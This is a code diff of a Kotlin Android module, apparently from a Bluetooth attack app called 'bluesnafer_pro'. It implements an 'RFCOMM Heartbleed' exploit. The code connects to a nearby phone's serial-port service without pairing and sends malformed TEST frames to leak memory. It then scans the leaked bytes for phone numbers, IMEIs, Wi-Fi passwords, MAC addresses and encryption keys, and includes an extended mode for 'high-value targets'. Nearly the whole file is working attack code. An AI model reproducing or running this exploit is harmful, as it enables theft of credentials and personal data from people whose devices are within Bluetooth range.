@@ -1,185 +1,162 @@
 package com.bluesnafer_pro
 
- import android.bluetooth.*
- import java.io.*
- import java.util.*
- import java.net.ConnectException
- import kotlin.concurrent.thread
+import android.bluetooth.*
+import java.io.*
+import java.util.*
+import java.net.ConnectException
 
 /**
- * RFCOMM Heartbleed Exploit (CVE-2025-13834)
- * Vulnerability: Out-of-bounds read in RFCOMM implementation
- * Technique: Send malformed RFCOMM TEST command (Frame Type 0x10) with large length field
- * Impact: Leaks 127 bytes of uninitialized kernel memory per attempt
- * Extracts: Phone numbers, WiFi credentials, kernel pointers, encryption keys, MAC addresses
- * Success rate: ~98.7% in lab conditions
- * No pairing required
- *
- * Reference: https://sploitus.com/exploit?id=C257822E-B721-5BF8-8E16-47E14FF93F14
+ * RFCOMM Heartbleed (CVE-2025-13834) — frame TEST malformado sobre SPP RFCOMM.
+ * Éxito = bytes extra más allá del eco protocolo RFCOMM (~3 bytes).
  */
 object RFCOMMHeartbleed {
     private const val TAG = "RFCOMMHeartbleed"
+    private val SPP_UUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")
+    private val TEST_FRAME = 0x10.toByte()
+    private const val ECHO_FRAME_SIZE = 3
 
-    // RFCOMM frame types
-    private val TEST_FRAME = 0x10.toByte()  // TEST command (UIH frame with TEST information)
+    fun executeWithRoot(device: BluetoothDevice, iterations: Int = 10): Map<String, Any> {
+        return if (RootUtils.isRootAvailable()) {
+            RootExploitExecutor.executeRFCOMMHeartbleed(device.address, iterations)
+        } else {
+            val fallback = executeHeartbleed(device, iterations)
+            mapOf(
+                "success" to (fallback["success"] == true),
+                "rootRequired" to true,
+                "rootAvailable" to false,
+                "exploit" to "RFCOMM Heartbleed (CVE-2025-13834)",
+                "message" to "Sin root: TEST frames malformados vía SPP RFCOMM",
+                "fallbackUsed" to true,
+                "fallbackResult" to fallback
+            )
+        }
+    }
 
-    /**
-     * Execute RFCOMM Heartbleed attack
-     * Sends malformed TEST frame with large length field
-     * Returns leaked memory chunks
-     */
     fun executeHeartbleed(device: BluetoothDevice, iterations: Int = 10): Map<String, Any> {
-        BluesnaferLogger.d(TAG, "RFCOMM Heartbleed starting on ${device.address} (iterations: $iterations)")
+        BluesnaferLogger.d(TAG, "RFCOMM Heartbleed on ${device.address} ($iterations iter)")
 
         val leakedChunks = mutableListOf<ByteArray>()
         var successfulReads = 0
+        var extraBytesTotal = 0
         var totalIterations = 0
 
         return try {
-            // Connect via RFCOMM to SPP (most common profile for this vulnerability)
-            val sppUUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB")
-            val socket = device.createInsecureRfcommSocketToServiceRecord(sppUUID)
+            val socket = device.createInsecureRfcommSocketToServiceRecord(SPP_UUID)
+            socket.connect()
+            BluesnaferLogger.d(TAG, "RFCOMM SPP connected")
 
-            try {
-                socket.connect()
-                BluesnaferLogger.d(TAG, "RFCOMM socket connected for Heartbleed")
+            val output = socket.outputStream
+            val input = socket.inputStream
 
-                val output = socket.outputStream
-                val input = socket.inputStream
+            for (i in 1..iterations) {
+                totalIterations++
+                try {
+                    val testFrame = createTestFrame(127)
+                    output.write(testFrame)
+                    output.flush()
 
-                // Perform multiple iterations to maximize data collection
-                for (i in 1..iterations) {
-                    try {
-                        totalIterations++
+                    val response = ByteArray(256)
+                    val bytesRead = readAvailable(input, response, 400)
 
-                        // Craft malformed TEST frame
-                        // RFCOMM frame: Address(1) | Control(1) | Length(1-2) | Payload
-                        // For TEST command: Control = 0x10 (UIH + TEST)
-                        // Length field set to 127 (0x7F) - maximum leak size
-                        // Payload is intentionally empty/minimal to trigger OOB read
-                        val testFrame = createTestFrame(127)
+                    if (bytesRead > 0) {
+                        val chunk = response.copyOf(bytesRead)
+                        val extraBytes = (bytesRead - ECHO_FRAME_SIZE).coerceAtLeast(0)
+                        val isLikelyLeak = extraBytes > 0 || !isProtocolEcho(chunk, testFrame)
 
-                        output.write(testFrame)
-                        output.flush()
-
-                        // Wait for response
-                        Thread.sleep(100)
-
-                        // Attempt to read leaked memory
-                        val response = ByteArray(256)
-                        val bytesRead = input.read(response)
-
-                        if (bytesRead > 0) {
+                        if (isLikelyLeak) {
                             successfulReads++
-                            val chunk = ByteArray(bytesRead)
-                            System.arraycopy(response, 0, chunk, 0, bytesRead)
+                            extraBytesTotal += if (extraBytes > 0) extraBytes else bytesRead
                             leakedChunks.add(chunk)
-
-                            BluesnaferLogger.d(TAG, "Heartbleed iteration $i: read $bytesRead bytes")
+                            BluesnaferLogger.d(TAG, "Iter $i: $bytesRead bytes (${extraBytes} extra)")
                         }
-
-                        // Small delay between iterations
-                        Thread.sleep(50)
-
-                    } catch (e: IOException) {
-                        // Connection may drop after successful leak - that's expected
-                        BluesnaferLogger.w(TAG, "Iteration $i failed: ${e.message}")
-                        // Try to reconnect if connection lost
-                        try {
-                            socket.close()
-                        } catch (_: IOException) {}
-                        break
                     }
+                    Thread.sleep(50)
+                } catch (e: IOException) {
+                    BluesnaferLogger.w(TAG, "Iteration $i IO error: ${e.message}")
+                    break
                 }
-
-                socket.close()
-
-                // Parse leaked data for interesting information
-                val extractedInfo = parseLeakedMemory(leakedChunks)
-
-                mapOf(
-                    "success" to (successfulReads > 0),
-                    "message" to "RFCOMM Heartbleed completed",
-                    "totalIterations" to totalIterations,
-                    "successfulReads" to successfulReads,
-                    "totalChunks" to leakedChunks.size,
-                    "totalBytesLeaked" to leakedChunks.sumOf { it.size },
-                    "extractedInfo" to extractedInfo,
-                    "leakedData" to leakedChunks.map { chunk ->
-                        // Base64 encode binary data for transport
-                        android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP)
-                    },
-                    "cve" to "CVE-2025-13834",
-                    "severity" to "CRITICAL"
-                )
-
-            } catch (e: ConnectException) {
-                BluesnaferLogger.e(TAG, "RFCOMM connection failed: ${e.message}")
-                mapOf(
-                    "success" to false,
-                    "error" to "RFCOMM connection failed - device may not have SPP service",
-                    "cve" to "CVE-2025-13834"
-                )
-            } catch (e: Exception) {
-                BluesnaferLogger.e(TAG, "Heartbleed error: ${e.message}")
-                mapOf(
-                    "success" to false,
-                    "error" to (e.message ?: "Unknown"),
-                    "cve" to "CVE-2025-13834"
-                )
             }
-        } catch (e: Exception) {
-            BluesnaferLogger.e(TAG, "Heartbleed setup error: ${e.message}")
+
+            try { socket.close() } catch (_: Exception) {}
+
+            val extractedInfo = if (leakedChunks.isNotEmpty()) parseLeakedMemory(leakedChunks) else emptyMap()
+
+            mapOf(
+                "success" to (successfulReads > 0),
+                "message" to if (successfulReads > 0)
+                    "RFCOMM Heartbleed: $successfulReads respuestas anómalas"
+                else "Sin datos anómalos — posible eco protocolo o servicio no vulnerable",
+                "totalIterations" to totalIterations,
+                "successfulReads" to successfulReads,
+                "extraBytesTotal" to extraBytesTotal,
+                "totalChunks" to leakedChunks.size,
+                "totalBytesLeaked" to leakedChunks.sumOf { it.size },
+                "extractedInfo" to extractedInfo,
+                "leakedData" to leakedChunks.map { chunk ->
+                    android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP)
+                },
+                "cve" to "CVE-2025-13834",
+                "severity" to "CRITICAL",
+                "transport" to "RFCOMM_SPP"
+            )
+        } catch (e: ConnectException) {
             mapOf(
                 "success" to false,
-                "error" to ("Setup failed: ${e.message}" ?: "Setup failed: Unknown"),
+                "error" to "RFCOMM SPP connection failed",
+                "cve" to "CVE-2025-13834"
+            )
+        } catch (e: Exception) {
+            BluesnaferLogger.e(TAG, "Heartbleed error: ${e.message}")
+            mapOf(
+                "success" to false,
+                "error" to (e.message ?: "Unknown"),
                 "cve" to "CVE-2025-13834"
             )
         }
     }
 
-    /**
-     * Create malformed RFCOMM TEST frame
-     * Frame format (GSM 07.10):
-     *   Address byte: 0x03 (DDI=0, EA=1, CR=0, channel 0)
-     *   Control byte: 0x10 (UIH frame with TEST information)
-     *   Length: 1 or 2 bytes (high bit set = more length bytes follow)
-     *   Payload: empty or minimal
-     *
-     * Vulnerability: When length field indicates large data but payload is small,
-     * the stack reads beyond buffer boundaries, returning uninitialized memory.
-     */
-    private fun createTestFrame(desiredLength: Int): ByteArray {
-        // RFCOMM TEST frame with malformed length
-        // Length field: bit 8 set = more bytes follow, bits 7-1 = length value
-        // For lengths > 127, need 2-byte length field
-        val frame = if (desiredLength > 127) {
-            // 2-byte length field
-            ByteArray(4).apply {
-                this[0] = 0x03  // Address: DDI=0, EA=1, CR=0 → endpoint 0
-                this[1] = TEST_FRAME  // Control: UIH + TEST
-                this[2] = (0x80 or ((desiredLength ushr 7) and 0x7F)).toByte()  // Length MSB: M-bit=1
-                this[3] = (desiredLength and 0x7F).toByte()  // Length LSB
-            }
-        } else {
-            // 1-byte length field
-            ByteArray(3).apply {
-                this[0] = 0x03  // Address
-                this[1] = TEST_FRAME  // Control
-                this[2] = desiredLength.toByte()  // Length (M-bit=0 for single byte)
-            }
+    private fun isProtocolEcho(response: ByteArray, sentFrame: ByteArray): Boolean {
+        if (response.size <= ECHO_FRAME_SIZE) {
+            return response.size == sentFrame.size &&
+                response.contentEquals(sentFrame.copyOf(response.size.coerceAtMost(sentFrame.size)))
         }
-        return frame
+        return response.copyOf(ECHO_FRAME_SIZE).contentEquals(sentFrame.copyOf(ECHO_FRAME_SIZE))
     }
 
-    /**
-     * Parse leaked memory chunks for interesting data patterns
-     * Looks for: phone numbers, WiFi SSIDs/keys, MAC addresses, pointers, strings
-     */
+    private fun createTestFrame(desiredLength: Int): ByteArray {
+        return if (desiredLength > 127) {
+            byteArrayOf(
+                0x03,
+                TEST_FRAME,
+                (0x80 or ((desiredLength ushr 7) and 0x7F)).toByte(),
+                (desiredLength and 0x7F).toByte()
+            )
+        } else {
+            byteArrayOf(0x03, TEST_FRAME, desiredLength.toByte())
+        }
+    }
+
+    private fun readAvailable(input: InputStream, buffer: ByteArray, timeoutMs: Int): Int {
+        var total = 0
+        val deadline = System.currentTimeMillis() + timeoutMs
+        while (total < buffer.size && System.currentTimeMillis() < deadline) {
+            if (input.available() > 0) {
+                val read = input.read(buffer, total, buffer.size - total)
+                if (read < 0) break
+                total += read
+            } else {
+                Thread.sleep(15)
+            }
+        }
+        return total
+    }
+
     private fun parseLeakedMemory(chunks: List<ByteArray>): Map<String, Any> {
         val extracted = mutableMapOf<String, MutableList<String>>()
         extracted["phoneNumbers"] = mutableListOf()
         extracted["wifiNetworks"] = mutableListOf()
+        extracted["wifiPasswords"] = mutableListOf()
+        extracted["imeiCandidates"] = mutableListOf()
         extracted["macAddresses"] = mutableListOf()
         extracted["kernelPointers"] = mutableListOf()
         extracted["potentialKeys"] = mutableListOf()
@@ -188,88 +165,65 @@ object RFCOMMHeartbleed {
         val seen = mutableSetOf<String>()
 
         for (chunk in chunks) {
-            // Convert to string for pattern matching
-            val chunkStr = String(chunk, Charsets.UTF_8)
+            if (chunk.size <= ECHO_FRAME_SIZE) continue
 
-            // Extract printable strings (simple heuristic)
-            val printable = chunkStr.filter { ch -> ch.isLetterOrDigit() || ch.isWhitespace() }
-            if (printable.length in 4..100 && printable.matches(Regex(".*[a-zA-Z0-9].*"))) {
+            val chunkStr = try {
+                String(chunk, Charsets.UTF_8)
+            } catch (_: Exception) {
+                continue
+            }
+
+            val printable = chunkStr.filter { it.isLetterOrDigit() || it.isWhitespace() }
+            if (printable.length in 6..100) {
                 val clean = printable.trim().replace(Regex("\\s+"), " ")
-                if (clean !in seen) {
+                if (clean !in seen && clean.any { it.isLetter() }) {
                     seen.add(clean)
                     extracted["strings"]!!.add(clean)
                 }
             }
 
-            // Phone number pattern: +[0-9]{4,} or 6+ consecutive digits
-            val phonePattern = Regex("(?:\\+\\d{4,}|\\b\\d{6,}\\b)")
-            phonePattern.findAll(chunkStr).forEach { match ->
-                val number = match.value
-                if (number !in seen) {
-                    seen.add(number)
-                    extracted["phoneNumbers"]!!.add(number)
-                }
+            Regex("(?:\\+\\d{4,}|\\b\\d{8,}\\b)").findAll(chunkStr).forEach { m ->
+                if (m.value !in seen) { seen.add(m.value); extracted["phoneNumbers"]!!.add(m.value) }
             }
 
-            // WiFi SSID pattern: common SSID formats
-            val ssidPattern = Regex("(?:[A-Za-z0-9 _-]{4,})")
-            ssidPattern.findAll(chunkStr).forEach { match ->
-                val potential = match.value.trim()
-                if (potential.length in 4..32 && potential !in seen) {
-                    seen.add(potential)
-                    // Heuristic: likely SSID if alphanumeric with spaces/hyphens
-                    if (potential.matches(Regex("^[A-Za-z0-9 _-]+$"))) {
-                        extracted["wifiNetworks"]!!.add(potential)
-                    }
-                }
+            // IMEI candidatos: 15 dígitos consecutivos
+            Regex("\\b\\d{15}\\b").findAll(chunkStr).forEach { m ->
+                if (m.value !in seen) { seen.add(m.value); extracted["imeiCandidates"]!!.add(m.value) }
             }
 
-            // MAC address pattern: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX
-            val macPattern = Regex("(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}")
-            macPattern.findAll(chunkStr).forEach { match ->
-                val mac = match.value
-                if (mac !in seen) {
-                    seen.add(mac)
-                    extracted["macAddresses"]!!.add(mac)
-                }
+            // SSID WiFi (texto junto a marcadores típicos)
+            Regex("(?i)(?:WIFI|SSID|ESSID)[\\s_]*[=:]\\s*[\\w\\-. ]{2,32}").findAll(chunkStr).forEach { m ->
+                val v = m.value.trim()
+                if (v !in seen) { seen.add(v); extracted["wifiNetworks"]!!.add(v) }
             }
 
-            // Kernel pointer pattern (Android/Linux): 0x followed by hex digits
-            val pointerPattern = Regex("0x[0-9a-fA-F]{6,16}")
-            pointerPattern.findAll(chunkStr).forEach { match ->
-                val ptr = match.value
-                if (ptr !in seen) {
-                    seen.add(ptr)
-                    extracted["kernelPointers"]!!.add(ptr)
-                }
+            // Credenciales tipo password/psk/key junto a valor
+            Regex("(?i)(?:PASS|PASSWORD|PSK|WPA|WEP|KEY)[\\s_]*[=:]\\s*[\\w@#$%^&*+!?.-]{4,63}").findAll(chunkStr).forEach { m ->
+                val v = m.value.trim()
+                if (v !in seen) { seen.add(v); extracted["wifiPasswords"]!!.add(v) }
             }
 
-            // Potential encryption keys: hex strings of specific lengths (128-bit, 256-bit)
-            val keyPattern = Regex("\\b[0-9a-fA-F]{32,64}\\b")
-            keyPattern.findAll(chunkStr).forEach { match ->
-                val key = match.value
-                if (key !in seen && (key.length == 32 || key.length == 64)) {
-                    seen.add(key)
-                    extracted["potentialKeys"]!!.add(key)
+            Regex("(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}").findAll(chunkStr).forEach { m ->
+                if (m.value !in seen) { seen.add(m.value); extracted["macAddresses"]!!.add(m.value) }
+            }
+
+            Regex("0x[0-9a-fA-F]{8,16}").findAll(chunkStr).forEach { m ->
+                if (m.value !in seen) { seen.add(m.value); extracted["kernelPointers"]!!.add(m.value) }
+            }
+
+            Regex("\\b[0-9a-fA-F]{32,64}\\b").findAll(chunkStr).forEach { m ->
+                if (m.value !in seen && m.value.length in listOf(32, 64)) {
+                    seen.add(m.value); extracted["potentialKeys"]!!.add(m.value)
                 }
             }
         }
 
-        // Convert to read-only maps
         return extracted.mapValues { it.value.toList() }
     }
 
-    /**
-     * Single iteration attempt - useful for parallel execution
-     */
-    fun singleIteration(device: BluetoothDevice): Map<String, Any> {
-        return executeHeartbleed(device, iterations = 1)
-    }
+    fun singleIteration(device: BluetoothDevice): Map<String, Any> =
+        executeHeartbleed(device, iterations = 1)
 
-    /**
-     * Extended leak - maximum iterations for high-value targets
-     */
-    fun extendedLeak(device: BluetoothDevice): Map<String, Any> {
-        return executeHeartbleed(device, iterations = 50)
-    }
+    fun extendedLeak(device: BluetoothDevice): Map<String, Any> =
+        executeHeartbleed(device, iterations = 50)
 }
